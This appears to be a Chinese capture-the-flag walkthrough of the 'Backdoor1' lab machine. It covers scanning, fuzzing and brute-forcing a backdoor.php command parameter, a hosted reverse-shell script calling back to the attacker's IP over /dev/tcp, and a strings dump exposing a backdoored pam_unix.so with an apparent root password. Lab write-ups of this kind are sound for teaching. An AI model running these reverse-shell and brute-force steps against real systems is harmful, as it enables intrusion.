![image-20250709215624782](https://7r1umphk.github.io/image/20250709215633404.webp)

打一个睡觉

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l           
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.172 08:00:27:56:2e:31       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

5 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.947 seconds (131.48 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.172     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-09 09:57 EDT
Nmap scan report for 192.168.205.172
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:56:2E:31 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                                                          
```

那直接看web

![image-20250709215805803](https://7r1umphk.github.io/image/20250709215806158.webp)

疯狂暗示后门，哈哈哈

扫一下目录

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.172 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.172
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 280]
/.html                (Status: 403) [Size: 280]
/index.html           (Status: 200) [Size: 12033]
/backdoor.php         (Status: 200) [Size: 0]
Progress: 49295 / 1102800 (4.47%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 50573 / 1102800 (4.59%)
===============================================================
Finished
===============================================================
                       
```

/backdoor.php啊这......

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.172/backdoor.php" -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
> GET /backdoor.php HTTP/1.1
> Host: 192.168.205.172
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 09 Jul 2025 13:59:12 GMT
< Server: Apache/2.4.62 (Debian)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 192.168.205.172 left intact
                                            
```

没东西，应该是需要点参数，爆破一下

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u "http://192.168.205.172/backdoor.php?FUZZ=id" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  --fw 1

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?FUZZ=id
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1
________________________________________________

password                [Status: 200, Size: 10, Words: 3, Lines: 1, Duration: 3ms]
cmd                     [Status: 200, Size: 15, Words: 3, Lines: 1, Duration: 0ms]
[WARN] Caught keyboard interrupt (Ctrl-C)

```

两个参数，password，我们也不知道，直接爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ ffuf -u "http://192.168.205.172/backdoor.php?cmd=id&password=FUZZ" -w /usr/share/wordlists/rockyou.txt   --fw 2                 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.205.172/backdoor.php?cmd=id&password=FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 2
________________________________________________

iloveyou                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 45ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```

`Gmeek-html<iframe src="//player.bilibili.com/player.html?isOutside=true&aid=113575678971704&bvid=BV19Bz4YuEi2&cid=27120961338&p=1&autoplay=0" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" width="100%" height="460px"></iframe>`

贫一下，哈哈哈

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl "http://192.168.205.172/backdoor.php?cmd=id&password=iloveyou" -v
*   Trying 192.168.205.172:80...
* Connected to 192.168.205.172 (192.168.205.172) port 80
* using HTTP/1.x
> GET /backdoor.php?cmd=id&password=iloveyou HTTP/1.1
> Host: 192.168.205.172
> User-Agent: curl/8.14.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Date: Wed, 09 Jul 2025 14:03:13 GMT
< Server: Apache/2.4.62 (Debian)
< Content-Length: 0
< Content-Type: text/html; charset=UTF-8
< 
* Connection #0 to host 192.168.205.172 left intact
                    
```

没显示，tcpdump看看，建议直接在浏览器访问

kali监听

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
```

![image-20250709220501352](https://7r1umphk.github.io/image/20250709220501561.webp)

发包卡了一会，看一下监听

```
┌──(kali㉿kali)-[~]
└─$ sudo tcpdump -A -n icmp
[sudo] kali 的密码：
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
10:04:53.658512 IP 192.168.205.172 > 192.168.205.128: ICMP echo request, id 620, seq 1, length 64
E..TaQ@.@.............e..l...wnh....SR
..................... !"#$%&'()*+,-./01234567
10:04:53.658530 IP 192.168.205.128 > 192.168.205.172: ICMP echo reply, id 620, seq 1, length 64
E..T.j..@./...........m..l...wnh....SR
..................... !"#$%&'()*+,-./01234567
10:04:54.688807 IP 192.168.205.172 > 192.168.205.128: ICMP echo request, id 620, seq 2, length 64
E..TbL@.@................l...wnh......
..................... !"#$%&'()*+,-./01234567
10:04:54.688827 IP 192.168.205.128 > 192.168.205.172: ICMP echo reply, id 620, seq 2, length 64
E..T....@./y.............l...wnh......
..................... !"#$%&'()*+,-./01234567
```

ok，没有问题，这边我弹shell直接访问reverce.sh了，因为这个靶机的模板默认就只要busybox，我懒的稳固

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cat reverse.sh                                                                             
bash -c "/bin/bash -i >& /dev/tcp/192.168.205.128/8888 0>&1"
              
```

然后开个web服务就好了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...

```

web访问

![image-20250709220710494](https://7r1umphk.github.io/image/20250709220710601.webp)

一直在转圈圈就对了

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lnvp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.172] 53922
bash: cannot set terminal process group (420): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Backdoor1:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@Backdoor1:/var/www/html$ ls -al
ls -al
total 24
drwxr-xr-x 2 root root  4096 Jul  8 09:26 .
drwxr-xr-x 3 root root  4096 Apr  4 23:20 ..
-rw-r--r-- 1 root root   310 Jul  8 09:25 backdoor.php
-rw-r--r-- 1 root root 12033 Jul  8 09:26 index.html
www-data@Backdoor1:/var/www/html$ cd /home
cd /home
www-data@Backdoor1:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root  root  4096 Jul  8 09:12 .
drwxr-xr-x 18 root  root  4096 Mar 18 20:37 ..
drwx------  2 morri morri 4096 Jul  8 09:13 morri
```

不给访问，那就试试弱密码吧，最近很喜欢出弱密码

```
www-data@Backdoor1:/home$ su morri
su morri
Password: morri
id
uid=1000(morri) gid=1000(morri) groups=1000(morri)
```

一发入魂

稳固

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

扒拉

```
morri@Backdoor1:/home$ cd morri/
morri@Backdoor1:~$ ls -al
total 24
drwx------ 2 morri morri 4096 Jul  8 09:13 .
drwxr-xr-x 3 root  root  4096 Jul  8 09:12 ..
-rw-r--r-- 1 morri morri  220 Jul  8 09:12 .bash_logout
-rw-r--r-- 1 morri morri 3526 Jul  8 09:12 .bashrc
-rw-r--r-- 1 morri morri  807 Jul  8 09:12 .profile
-rw-r--r-- 1 root  root    44 Jul  8 09:13 user.txt
morri@Backdoor1:~$ cat user.txt 
flag{user-4645258dd0f71f7f430bb4f3c37748e6}
morri@Backdoor1:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for morri: 
Sorry, user morri may not run sudo on Backdoor1.
morri@Backdoor1:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
morri@Backdoor1:~$ ss -tulnp
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*      
tcp     LISTEN   0        128                 [::]:22               [::]:*      
tcp     LISTEN   0        128                    *:80                  *:*      
morri@Backdoor1:~$ cd /opt/
morri@Backdoor1:/opt$ ls -al
total 8
drwxr-xr-x  2 root root 4096 Apr  1 08:59 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls /mnt/
morri@Backdoor1:/opt$ ls -la /mnt/
total 8
drwxr-xr-x  2 root root 4096 Mar 18 20:26 .
drwxr-xr-x 18 root root 4096 Mar 18 20:37 ..
morri@Backdoor1:/opt$ ls -la /tmp/
total 8
```

什么都没有，按时间扒拉一下文件

```
morri@Backdoor1:/opt$ find / -type f -newermt "2025-07-05" ! -newermt "2025-07-10" ! -path '/proc/*' ! -path '/sys/*' ! -path '/run/*' 2>/dev/null
/usr/lib/x86_64-linux-gnu/security/pam_unix.so
/home/morri/.bash_logout
/home/morri/.bashrc
/home/morri/user.txt
/home/morri/.profile
/etc/gshadow-
/etc/sudoers
/etc/subgid-
/etc/apt/sources.list
/etc/hosts
/etc/ld.so.cache
/etc/shadow-
/etc/subgid
/etc/passwd-
/etc/gshadow
/etc/group-
/etc/shadow
/etc/subuid-
/etc/php/8.3/apache2/php.ini
/etc/subuid
/etc/group
/etc/hostname
/etc/resolv.conf
/etc/passwd
/var/www/html/index.html
/var/www/html/backdoor.php
/var/log/debug
/var/log/daemon.log.1
/var/log/apt/eipp.log.xz
/var/log/apt/term.log
/var/log/apt/history.log
/var/log/kern.log
/var/log/syslog
/var/log/btmp
/var/log/auth.log.1
/var/log/auth.log
/var/log/dpkg.log
/var/log/alternatives.log
/var/log/lastlog
/var/log/wtmp
/var/log/syslog.1
/var/log/faillog
/var/log/debug.1
/var/log/syslog.2.gz
/var/log/daemon.log
/var/log/user.log
/var/log/messages
/var/log/messages.1
/var/log/kern.log.1
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006397f6f5f0cb6-e7cfe6374e33fdfc.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system.journal
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/system@0006396a764f42ae-bf156f4b6c4eb513.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000@0006396aa29dceaf-fdca4d5bafaa45b8.journal~
/var/log/journal/52a22a6e47cb4a5995fb43c3554baa0e/user-1000.journal
/var/lib/dhcp/dhclient.enp0s3.leases
/var/lib/dpkg/lock
/var/lib/dpkg/info/libfl2:amd64.list
/var/lib/dpkg/info/curl.list
/var/lib/dpkg/info/m4.list
/var/lib/dpkg/info/flex.list
/var/lib/dpkg/info/libpam0g-dev:amd64.list
/var/lib/dpkg/info/libsigsegv2:amd64.list
/var/lib/dpkg/info/wget.list
/var/lib/dpkg/info/libfl-dev:amd64.list
/var/lib/dpkg/info/netcat-openbsd.list
/var/lib/dpkg/info/bison.list
/var/lib/dpkg/info/netcat.list
/var/lib/dpkg/info/libpam0g:amd64.list
/var/lib/dpkg/alternatives/yacc
/var/lib/dpkg/alternatives/nc
/var/lib/dpkg/triggers/Lock
/var/lib/dpkg/status
/var/lib/dpkg/status-old
/var/lib/apt/lists/mirrors.aliyun.com_debian_dists_bullseye-backports_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_binary-amd64_Packages
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_InRelease
/var/lib/apt/lists/packages.sury.org_php_dists_bullseye_main_source_Sources
/var/lib/apt/extended_states
/var/lib/systemd/random-seed
/var/lib/systemd/timesync/clock
/var/lib/systemd/timers/stamp-logrotate.timer
/var/lib/systemd/timers/stamp-phpsessionclean.timer
/var/lib/sudo/lectured/morri
/var/lib/logrotate/status
/var/cache/apt/pkgcache.bin
/var/cache/apt/srcpkgcache.bin
/var/cache/debconf/templates.dat
/var/cache/debconf/config.dat-old
/var/cache/debconf/config.dat
/var/cache/debconf/templates.dat-old
```

他改了/usr/lib/x86_64-linux-gnu/security/pam_unix.so，这是PAM框架的一部分,通俗易懂一点就是密码验证

string瞄眼

````
morri@Backdoor1:/opt$ strings /usr/lib/x86_64-linux-gnu/security/pam_unix.so
P`^B
__gmon_start__
_ITM_deregisterTMCloneTable
_ITM_registerTMCloneTable
__cxa_finalize
calloc
malloc
strncpy
strlen
crypt_r
free
pipe
fork
dup2
pam_modutil_sanitize_helper_fds
geteuid
setuid
execve
pam_syslog
stdout
fflush
_exit
__errno_location
waitpid
sigaction
pam_modutil_read
__isoc99_sscanf
pam_sm_acct_mgmt
pam_get_item
getuid
pam_get_data
dcngettext
snprintf
dcgettext
pam_sm_authenticate
pam_get_user
pam_get_authtok
pam_set_data
pam_sm_setcred
strcmp
fopen
fgets
strncmp
strtok_r
fclose
pam_sm_chauthtok
pam_prompt
pam_set_item
yp_get_default_domain
yp_master
getrpcport
strdup
clnt_create
authunix_create_default
xdr_int
clnt_sperrno
yperr_string
pam_sm_open_session
pam_modutil_getlogin
pam_sm_close_session
write
feof
__getdelim
strchr
__ctype_b_loc
strsep
strcasecmp
strncasecmp
strtol
memset
yp_bind
yp_match
yp_unbind
strcpy
memcpy
pam_fail_delay
gettimeofday
getpid
clock
pam_modutil_getpwnam
pam_modutil_getspnam
time
stpcpy
usleep
ulckpwdf
umask
fileno
__fxstat
fchown
fchmod
fputs
fsync
rename
unlink
fgetpwent
putpwent
fgetspent
putspent
xdr_string
strncat
libpam.so.0
libcrypt.so.1
libnsl.so.2
libc.so.6
pam_unix.so
XCRYPT_2.0
LIBNSL_1.0
GLIBC_2.3
GLIBC_2.7
GLIBC_2.14
GLIBC_2.2.5
LIBPAM_EXTENSION_1.1
LIBPAM_EXTENSION_1.0
LIBPAM_1.0
LIBPAM_MODUTIL_1.0
LIBPAM_MODUTIL_1.1.9
/root/Linux-PAM-1.3.1/libpam/.libs
u/UH
AWAVI
AUATUH
[]A\A]A^A_
AVAUI
[]A\A]A^A_
t$01
AUATUH
]A\A]A^
T$ H
HcL$
T$ H
D$ H
D$ H
AUATUH
]A\A]A^
]A\A]A^
 []A\
[]A\
AWAVAUATI
[]A\A]A^A_
AVAUATUSH
L$@H
T$<H
t$X1
t$HH
t$HL
D$PH
l$`H
D$XD
D$DH
T$XD
T$XH
t$HH
t$HD
D$DH
L$`D
L$@H
t$`D
D$<H
D$XH
[]A\A]A^A_
T$HD
T$X1
T$XH
t$HD
t$HD
t$HA
D$hH
|$pH
D$hH
D$ H
D$pH
L$ H
t$hE
L$ H
ATUH
[]A\A]
[]A\A]
uWE1
[]A\
[]A\
AVAUI
t$01
[]A\A]A^A_
ATUSH
[]A\
 []A\
ASARL
ATUSH
[]A\A]A^
AVAUATA
|$ H
t$,H
L$,D
@D#d
8[]D
A\A]A^A_
|$ H
|$ H
|$ H
|$ H
|$ 1
AVAUA
u&E1
[]A\A]A^A_
|$xL
L$lL
D$pH
|$xA
D$xA
l$xI
D$\H
|$ H
|$0H
T$HH
D$@B
D$\H
D$xH
l$xL
l$xL
t$ I
l$xL
t$0I
AUATUH
 ]A\A]
 ]A\A]
AUATI
L$ H
-UN*X-FAH
|$ H
|$ H
[]A\A]A^A_
T$(H
D$(H
t$ H
L$@H
T$8H
D$HM
ATUIc
[]A\A]A^
t$0L
AWAVAUA
u#E1
[]A\A]A^A_
[]A\A]
[]A\A]
[]A\A]
ATUH
[]A\
[]A\
K H)
{0H9
$$1$
AWAVAUATI
|$ L
h[]A\A]A^A_
h[]A\A]A^A_
[]A\A]A^A_
AWAVAUATUSH
t$\D
|$`L
|$XL
T$8H
D$ H
D$(H
[]A\A]A^A_
tmE9
D$8H
L$0L
D$8H
AWAVAUI
ATUSH
t$0D
|$,H
|$(H
[]A\A]A^A_
AWAVI
ATUSH
|$|H
|$xH
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
AVAUATUSD
p $E
QZ^&
A]A^
AWAVI
[]A\A]A^A_
[]A\
AVAUATI
t$0H
=UUUUwni
$w}E
=UUUUv
|$ H
D$,
|$'L
|$-
|$(L
|$.
|$)L
|$/
|$*L
|$%
[]A\A]A^A_
Could not make pipe: %m
stdout
dup2 of %s failed: %m
setuid failed: %m
/sbin/unix_chkpwd
chkexpiry
unix_chkpwd abnormal exit: %d
Fork failed: %m
unix_setcred_return
Linux-PAM
helper binary execve failed: %m
read unix_chkpwd output error %d: %m
unix_chkpwd waitpid returned %d: %m
could not identify user (from uid=%lu)
could not identify user (from getpwnam(%s))
account %s has expired (account expired)
Your account has expired; please contact your system administrator
expired password for user %s (root enforced)
You are required to change your password immediately (administrator enforced)
expired password for user %s (password aged)
You are required to change your password immediately (password expired)
account %s has expired (failed to change password)
password for user %s will expire in %d days
Warning: your password will expire in %d days
Warning: your password will expire in %d day
pam_unix_auth: cannot allocate ret_data
auth could not identify password for [%s]
PAM: Root access granted via backdoor
bad username [%s]
660930334
No password supplied
Password unchanged
Can not get username
/etc/security/opasswd
bad authentication token
 or NIS
 not
username [%s] obtained
Changing password for %s.
user not authenticated
user shadow entry expired
new password not acceptable 2
can't get local yp domain: %s
passwd.byname
new password not acceptable
You must choose a longer password
can't open %s file to check old passwords
Password has been already used. Choose another.
password - could not identify user
user "%s" does not exist in /etc/passwd%s
user "%s" has corrupted passwd entry
password - (old) token not obtained
You must wait longer to change your password
password - new password not obtained
user password changed by another process
crypt() failure or out of memory for password
can't find the master ypserver: %s
yppasswdd not running on NIS master host
yppasswd daemon running on illegal port
Use NIS server on %s with port %d
password%s changed for %s on %s
NIS password could not be changed.
password received unknown request
session closed for user %s
open_session - error recovering username
open_session - error recovering service
session opened for user %s by %s(uid=%lu)
close_session - error recovering username
close_session - error recovering service
nullok
nonull
stdin
 user=
**unknown**
/etc/login.defs
ENCRYPT_METHOD
SHA_CRYPT_MAX_ROUNDS
unrecognized option [%s]
/etc/passwd
_pam_unix_getpwnam_%s
no memory for data-name
check pass; user (%s) unknown
check pass; user unknown
audit
use_first_pass
try_first_pass
authtok_type=
use_authtok
debug
nodelay
bigcrypt
likeauth
remember=
noreap
broken_shadow
sha256
sha512
rounds=
blowfish
minlen=
quiet
no_pass_expiry
Cannot send password to helper: %m
%d more authentication failure%s; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
service(%s) ignoring max retries; %d > %d
option remember not allowed for this module type
option minlen not allowed for this module type
option rounds not allowed for this module type
Password minlen reset to 8 characters
unrecognized ENCRYPT_METHOD value [%s]
authentication failure; logname=%s uid=%d euid=%d tty=%s ruser=%s rhost=%s %s%s
no memory for failure recorder
/dev/urandom
*NP*
$2a$
rounds=%u$
/etc/security/nopasswd
%s:%s:%d:%s
%s:%s:%d:%s,%s
%s:%lu:1:%s
/etc/npasswd
password changed for %s
/etc/nshadow
/etc/shadow
account %s has password changed in future
Algo %s not supported by the crypto backend, falling back to MD5
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
|!3)
|%rc
        3       -
        4       -
        8       -
        9       -
        :       -
 low
"key
 low
(pwd
~20'
 $0.(
;pwd
;err
(buf
;len
><D
Cerr
"pwd
'new
'old
"tty
9% 1
"pwd
"fds
'len
!nis
!nis
!ret
"buf
~"len
!err
P"tty
5val
;key
=buf
?=tmp
;__n
~$len
0pwd
0pwd
0pwd
 $,(
 $,(
/usr/include
bigcrypt.c
crypt.h
stdlib.h
string.h
<built-in>
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include
../../libpam/include/security
/usr/include/x86_64-linux-gnu/sys
pam_unix_acct.c
stddef.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
shadow.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
stdio.h
pam_modules.h
passverify.h
unistd.h
pam_ext.h
libintl.h
pam_modutil.h
errno.h
wait.h
<built-in>
../../libpam/include/security
/usr/include
/usr/include/x86_64-linux-gnu/sys
pam_unix_auth.c
support.h
_pam_types.h
pam_modules.h
stdlib.h
pam_ext.h
syslog.h
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
/usr/include/x86_64-linux-gnu/sys
/usr/include
../../libpam/include/security
/usr/include/rpc
/usr/include/netinet
/usr/include/rpcsvc
pam_unix_passwd.c
stddef.h
types.h
struct_FILE.h
FILE.h
types.h
stdint-intn.h
struct_timeval.h
pwd.h
shadow.h
_pam_types.h
support.h
types.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
auth.h
clnt.h
yppasswd.h
pam_ext.h
ypclnt.h
passverify.h
string.h
malloc.h
libintl.h
pam_modules.h
md5.h
stdio.h
../../libpam/include/security
/usr/include
pam_unix_sess.c
support.h
_pam_types.h
pam_ext.h
pam_modutil.h
unistd.h
/usr/include/x86_64-linux-gnu/bits
/usr/include
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/sys
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include/rpcsvc
support.c
stdio.h
stdlib.h
stddef.h
types.h
types.h
__sigset_t.h
struct_FILE.h
FILE.h
pwd.h
__sigval_t.h
siginfo_t.h
signal.h
sigaction.h
_pam_types.h
support.h
pam_ext.h
pam_modutil.h
string.h
unistd.h
pam_modules.h
malloc.h
passverify.h
errno.h
wait.h
stdio.h
ctype.h
ypclnt.h
<built-in>
strings.h
[Y;YYWYYWYYWY
/usr/include/x86_64-linux-gnu/sys
/usr/lib/gcc/x86_64-linux-gnu/10/include
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/bits/types
../../libpam/include/security
/usr/include
passverify.c
stat.h
stddef.h
types.h
struct_timeval.h
struct_timespec.h
_pam_types.h
pwd.h
FILE.h
struct_FILE.h
support.h
shadow.h
time.h
stat.h
crypt.h
md5.h
stdio.h
unistd.h
string.h
time.h
pam_ext.h
stdlib.h
pam_modutil.h
bigcrypt.h
<built-in>
fcntl.h
errno.h
/X ..
X  ..
[  ..
= J.
<  X
f...
/usr/include/rpc
/usr/include/x86_64-linux-gnu/bits
/usr/include/x86_64-linux-gnu/sys
/usr/include/netinet
yppasswd_xdr.c
types.h
types.h
types.h
stdint-intn.h
stdint-uintn.h
sockaddr.h
socket.h
in.h
un.h
xdr.h
yppasswd.h
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
<built-in>
r/;<
u;=I
==H<
0:/;=I<
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V>,
.K-=-
fu-=-
/-/-Ju.I<
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:<
yJ.K
        ?/KH
/usr/include
md5.c
md5_crypt.c
md5.h
stdlib.h
string.h
<built-in>
r/;<
u;=I
==H<
0:/;=I<
18=-
uI=;
ue=-
Jtu-
ftu-
K-=-
Jtu-
ftu-
K-=-
K-=-
Jtu-
ftu-
ftu-
Jtu-
.V>,
.K-=-
fu-=-
/-/-Ju.I<
.W=-
0,0,.
.W=-
.W=-
0:0:.
:/=:<
yJ.K
        ?/KH
internal
bigcrypt
crypt_data
short unsigned int
cipher_ptr
__xx__
tmp_ptr
unsigned char
input
initialized
bigcrypt.c
setting
strncpy
plaintext_ptr
crypt_r
GNU C17 10.2.1 20210110 -mtune=generic -march=x86-64 -g -O2 -fPIC -fasynchronous-unwind-tables
long long unsigned int
dec_c2_cryptbuf
__builtin_calloc
long long int
keybuf
/root/Linux-PAM-1.3.1/modules/pam_unix
short int
keylen
output
n_seg
cdata
salt_ptr
malloc
__off_t
__gid_t
_IO_read_ptr
_pkey
_chain
void_uname
__sigval_t
si_errno
_shortbuf
_make_remark
is_hash_algo
sa_flags
_IO_read_base
__sighandler_t
_lower
si_stime
pipe
_arch
pw_shell
_exit
dup2
pamh
_fileno
_IO_read_end
_sigchld
authrv
_IO_backup_base
__isoc99_sscanf
execve
envp
_cur_column
_upper
si_overrun
_IO_codecvt
sp_inact
_bounds
si_addr
sp_max
_old_offset
sp_min
si_addr_lsb
si_sigval
sp_flag
newsa
geteuid
__off64_t
pam_unix_acct.c
si_pid
pam_modutil_redirect_fd
_IO_marker
_freeres_buf
PAM_MODUTIL_IGNORE_FD
__val
si_utime
get_account_info
_IO_write_ptr
__sigset_t
waitpid
fork
si_uid
_pad
siginfo_t
_IO_save_base
sival_int
sp_expire
pam_modutil_sanitize_helper_fds
_lock
_sigsys
_flags2
__builtin_puts
stdout
pw_passwd
_syscall
pam_sm_acct_mgmt
unix_args
pw_gid
_sigpoll
_sifields
pam_get_data
_IO_write_end
PAM_MODUTIL_PIPE_FD
_IO_lock_t
_IO_FILE
setuid
oldsa
si_tid
__clock_t
UNIX_Ctrls
pam_get_item
dcngettext
sp_pwdp
PAM_MODUTIL_NULL_FD
token
fflush
_markers
pw_dir
_sigfault
sp_warn
pam_handle_t
_IO_buf_end
_addr_bnd
__pid_t
_call_addr
pw_gecos
_vtable_offset
pretval
dcgettext
spwd
si_status
argc
__errno_location
__uint32_t
check_shadow_expiry
__uid_t
__sigaction_handler
si_signo
_kill
_IO_save_end
sa_sigaction
sa_mask
daysleft
__pad0
__pad5
snprintf
sp_lstchg
_unused2
sa_restorer
pw_name
_unix_run_verify_binary
pam_handle
_set_ctrl
getuid
pam_modutil_read
_timer
si_fd
pam_syslog
pw_uid
sa_handler
_freeres_list
sival_ptr
_IO_wide_data
si_band
argv
_IO_write_base
_IO_buf_base
sp_namp
child
si_code
ret_data
pam_sm_setcred
_unix_verify_password
_unix_blankpasswd
pam_set_data
pam_get_authtok
setcred_free
pam_get_user
pam_sm_authenticate
pam_unix_auth.c
pass_old
AUTH_REJECTEDCRED
XDR_DECODE
